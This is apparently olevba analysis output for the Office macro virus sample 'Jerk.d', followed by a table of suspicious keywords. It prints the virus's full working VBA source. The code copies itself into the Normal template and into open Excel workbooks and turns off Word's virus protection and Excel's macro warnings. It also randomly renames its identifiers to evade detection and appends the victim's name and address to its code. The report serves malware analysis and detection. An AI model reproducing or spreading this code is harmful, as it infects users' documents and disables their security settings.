olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.d-49d053efb4e61c23b05cd471ec955a65a5eaa193
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.d-49d053efb4e61c23b05cd471ec955a65a5eaa193 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const YVIXS = 1, GFNSCPWSLWFIVI = True, PFUKLXCI = False, RZOCWYDF = 0
Dim XFAGVQDWHOWK, SFAFUUZLAPGUR As String
Dim JNRMNS, CBKQGW As Integer
Dim PWCMOEXEHWJJLOB As Boolean
SFAFUUZLAPGUR = "ThisWorkbook"
XFAGVQDWHOWK = Application.ThisWorkbook.VBProject.VBComponents.Item(YVIXS).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(YVIXS).CodeModule.CountOfLines)
Call TDHCILMMQIQXCCE(XFAGVQDWHOWK)
For JNRMNS = YVIXS To Application.Workbooks.Count
PWCMOEXEHWJJLOB = PFUKLXCI
For CBKQGW = YVIXS To Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Count
If Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.CountOfLines = RZOCWYDF Then
If Application.Workbooks.Item(JNRMNS).Path <> "" And Application.Workbooks.Item(JNRMNS).Saved = GFNSCPWSLWFIVI And PWCMOEXEHWJJLOB = PFUKLXCI Then PWCMOEXEHWJJLOB = GFNSCPWSLWFIVI
Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).Name = SFAFUUZLAPGUR Then
Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine YVIXS * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine YVIXS * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next CBKQGW
If PWCMOEXEHWJJLOB = GFNSCPWSLWFIVI Then Application.Workbooks.Item(JNRMNS).Save
Next JNRMNS
End Sub
Private Sub Document_Close()
On Error Resume Next
Const GFNSCPWSLWFIVI = True, PFUKLXCI = False, RZOCWYDF = 0, YVIXS = 1, RQDRJVU = wdFormatDocument, TJRJUPY = wdFormatTemplate, WOXRLNGIR = ":"
Dim PWCMOEXEHWJJLOB, JVNFGNO, VEVXXS, DRLAPPGEYHXACC As Boolean
Dim EFDWG, NMGFZIGAPVE As Object
Dim PFJIAJDOSZGUP, XFAGVQDWHOWK As String
If Month(YVIXS * Now) > YVIXS * 2 + YVIXS * 3 And Day(YVIXS * Now) = 4 + YVIXS * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set EFDWG = ActiveDocument.VBProject.VBComponents.Item(YVIXS)
Set NMGFZIGAPVE = NormalTemplate.VBProject.VBComponents.Item(YVIXS)
Randomize
VEVXXS = PFUKLXCI
DRLAPPGEYHXACC = PFUKLXCI
If EFDWG.CodeModule.CountOfLines <> RZOCWYDF Then VEVXXS = GFNSCPWSLWFIVI
If NMGFZIGAPVE.CodeModule.CountOfLines <> RZOCWYDF Then DRLAPPGEYHXACC = GFNSCPWSLWFIVI
Options.VirusProtection = PFUKLXCI
If (VEVXXS = GFNSCPWSLWFIVI Xor DRLAPPGEYHXACC = GFNSCPWSLWFIVI) And (ActiveDocument.SaveFormat = RQDRJVU Or ActiveDocument.SaveFormat = TJRJUPY) Then
If VEVXXS = GFNSCPWSLWFIVI Then
JVNFGNO = NormalTemplate.Saved
XFAGVQDWHOWK = EFDWG.CodeModule.Lines(YVIXS, EFDWG.CodeModule.CountOfLines)
Call RKCNGS(XFAGVQDWHOWK)
If Int(Rnd * 10 * YVIXS) = YVIXS * 7 Then Call JPPFNH(XFAGVQDWHOWK)
Call FWXSYE(XFAGVQDWHOWK)
NMGFZIGAPVE.CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If JVNFGNO = GFNSCPWSLWFIVI Then NormalTemplate.Save
End If
PFJIAJDOSZGUP = Mid(ActiveDocument.FullName, 2, YVIXS)
If DRLAPPGEYHXACC = GFNSCPWSLWFIVI And (PFJIAJDOSZGUP = WOXRLNGIR Or ActiveDocument.Saved = PFUKLXCI) Then
PWCMOEXEHWJJLOB = ActiveDocument.Saved
XFAGVQDWHOWK = NMGFZIGAPVE.CodeModule.Lines(YVIXS, NMGFZIGAPVE.CodeModule.CountOfLines)
Call FWXSYE(XFAGVQDWHOWK)
EFDWG.CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If PWCMOEXEHWJJLOB = GFNSCPWSLWFIVI Then ActiveDocument.Save
End If
End If
End Sub
Private Sub JPPFNH(ByRef XFAGVQDWHOWK As String)
On Error Resume Next
Const BNFFMRZQDUKZL = 48, HRDFFLIFPL = 15, KDWECJJ = 5, BQGSSGXM = 65, AGSKWWUMTZDP = 90, YVIXS = 1, GFNSCPWSLWFIVI = True, PFUKLXCI = False
Dim QUBCASHQVGAUS, OFAYBMKQUTmp, XTVXIWR, OFAYBMKQU(YVIXS To BNFFMRZQDUKZL), OFAYBMKQU2(YVIXS To BNFFMRZQDUKZL) As String
Dim JNRMNS, CBKQGW, EYWGRQMP As Integer
Dim JJUFCNQDGK As Boolean
QUBCASHQVGAUS = "XFAGVQDWHOWK BNFFMRZQDUKZL OFAYBMKQU OFAYBMKQU2 XTVXIWR JNRMNS CBKQGW EYWGRQMP JJUFCNQDGK JPPFNH HRDFFLIFPL KDWECJJ BQGSSGXM AGSKWWUMTZDP YVIXS QUBCASHQVGAUS OFAYBMKQUTmp PWCMOEXEHWJJLOB JVNFGNO VEVXXS DRLAPPGEYHXACC EFDWG NMGFZIGAPVE RKCNGS TKXACEQEWK TYEOXRHKCZXGU RRONBZRHQUP CTVSEIGJTDI TKXACEQEWKTmp BSCSSNLMEA BQNVZMMODB PFJIAJDOSZGUP GFNSCPWSLWFIVI PFUKLXCI RZOCWYDF RQDRJVU TJRJUPY HXTMDEVREJQNGOD JENPKIOAQRVUXEM WOXRLNGIR IWRVWLXNQN FJBCNOTRBLSZ SFAFUUZLAPGUR TDHCILMMQIQXCCE FWXSYE FRNLIBJWNMKHY XDLVNVWH XSBJJWF"
Randomize
CBKQGW = YVIXS
For JNRMNS = YVIXS To Len(QUBCASHQVGAUS)
If Mid(QUBCASHQVGAUS, JNRMNS, YVIXS) = " " Or JNRMNS = Len(QUBCASHQVGAUS) Then
If JNRMNS = Len(QUBCASHQVGAUS) Then OFAYBMKQUTmp = OFAYBMKQUTmp & Mid(QUBCASHQVGAUS, JNRMNS, YVIXS)
For EYWGRQMP = YVIXS To Int((HRDFFLIFPL - KDWECJJ + YVIXS) * Rnd + KDWECJJ)
OFAYBMKQU2(CBKQGW) = OFAYBMKQU2(CBKQGW) & Chr(Int((AGSKWWUMTZDP - BQGSSGXM + YVIXS) * Rnd + BQGSSGXM))
Next EYWGRQMP
OFAYBMKQU(CBKQGW) = OFAYBMKQUTmp
OFAYBMKQUTmp = ""
CBKQGW = CBKQGW + YVIXS
Else
OFAYBMKQUTmp = OFAYBMKQUTmp & Mid(QUBCASHQVGAUS, JNRMNS, YVIXS)
End If
Next JNRMNS
JJUFCNQDGK = PFUKLXCI
For JNRMNS = YVIXS To Len(XFAGVQDWHOWK)
For CBKQGW = YVIXS To BNFFMRZQDUKZL
If Mid(XFAGVQDWHOWK, JNRMNS, Len(OFAYBMKQU(CBKQGW))) = OFAYBMKQU(CBKQGW) Then
XTVXIWR = XTVXIWR & OFAYBMKQU2(CBKQGW)
JNRMNS = JNRMNS + Len(OFAYBMKQU(CBKQGW)) - YVIXS
JJUFCNQDGK = GFNSCPWSLWFIVI
Exit For
End If
Next CBKQGW
If JJUFCNQDGK = PFUKLXCI Then
XTVXIWR = XTVXIWR & Mid(XFAGVQDWHOWK, JNRMNS, YVIXS)
Else
JJUFCNQDGK = PFUKLXCI
End If
Next JNRMNS
XFAGVQDWHOWK = XTVXIWR
End Sub
Private Sub RKCNGS(ByRef XFAGVQDWHOWK As String)
On Error Resume Next
Const CTVSEIGJTDI = "' ", YVIXS = 1
Const HXTMDEVREJQNGOD = "hh:mm:ss: AMPM - ", JENPKIOAQRVUXEM = "dddd, d mmm yyyy"
Dim TKXACEQEWKTmp, TKXACEQEWK, BSCSSNLMEA, BQNVZMMODB, TYEOXRHKCZXGU, RRONBZRHQUP As String
Dim JNRMNS As Integer
TYEOXRHKCZXGU = Chr(10 * YVIXS + 3)
TKXACEQEWK = Application.UserAddress
BQNVZMMODB = Format(Time, HXTMDEVREJQNGOD) & Format(Date, JENPKIOAQRVUXEM)
RRONBZRHQUP = Chr(YVIXS * 10)
BSCSSNLMEA = Application.UserName
For JNRMNS = YVIXS To Len(TKXACEQEWK)
If Mid(TKXACEQEWK, JNRMNS, YVIXS) <> TYEOXRHKCZXGU Then
If Mid(TKXACEQEWK, JNRMNS, YVIXS) <> RRONBZRHQUP Then
TKXACEQEWKTmp = TKXACEQEWKTmp & Mid(TKXACEQEWK, JNRMNS, YVIXS)
End If
Else
TKXACEQEWKTmp = TKXACEQEWKTmp & TYEOXRHKCZXGU & CTVSEIGJTDI
End If
Next JNRMNS
XFAGVQDWHOWK = XFAGVQDWHOWK & TYEOXRHKCZXGU & CTVSEIGJTDI & BQNVZMMODB & TYEOXRHKCZXGU & CTVSEIGJTDI & BSCSSNLMEA & TYEOXRHKCZXGU & CTVSEIGJTDI & TKXACEQEWK & TYEOXRHKCZXGU
End Sub
Private Sub FWXSYE(ByVal XFAGVQDWHOWK As String)
On Error Resume Next
Dim XSBJJWF As Long
Dim IWRVWLXNQN As Object
Dim FRNLIBJWNMKHY, XDLVNVWH As String
FRNLIBJWNMKHY = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
XSBJJWF = &H0
XDLVNVWH = "Options6"
System.PrivateProfileString("", FRNLIBJWNMKHY, XDLVNVWH) = XSBJJWF
Set IWRVWLXNQN = GetObject(, "Excel.Application")
Const YVIXS = 1, RZOCWYDF = 0
Dim SFAFUUZLAPGUR As String
Dim JNRMNS, CBKQGW As Integer
SFAFUUZLAPGUR = "ThisWorkbook"
For JNRMNS = YVIXS To IWRVWLXNQN.Application.Workbooks.Count
For CBKQGW = YVIXS To IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Count
If IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.CountOfLines = RZOCWYDF Then
IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.InsertLines YVIXS, XFAGVQDWHOWK
If IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).Name = SFAFUUZLAPGUR Then
IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine 33 * YVIXS, "Private Sub Workbook_Deactivate()"
Else
IWRVWLXNQN.Application.Workbooks.Item(JNRMNS).VBProject.VBComponents.Item(CBKQGW).CodeModule.ReplaceLine YVIXS * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next CBKQGW
Next JNRMNS
Set IWRVWLXNQN = Nothing
End Sub
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'

' 05:50:07:  - tiistai, 23 helmi 1999
' Taloustieteellinen osasto
'

' 08:31:13:  - maanantai, 1 maalis 1999
' Taloustieteellinen osasto
'

' 04:45:45:  - keskiviikko, 3 maalis 1999
' Pohjola
'

' 04:22:45:  - tiistai, 27 huhti 1999
' DF
'

' 09:37:21:  - miðvikudagur, 28 apr 1999
' Vesselin Vladimirov Bontchev
'

' 10:04:46:  - miðvikudagur, 28 apr 1999
' Vesselin Vladimirov Bontchev
'

' 03:03:45: PM - Tuesday, 10 Oct 2000
' Harry H.
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
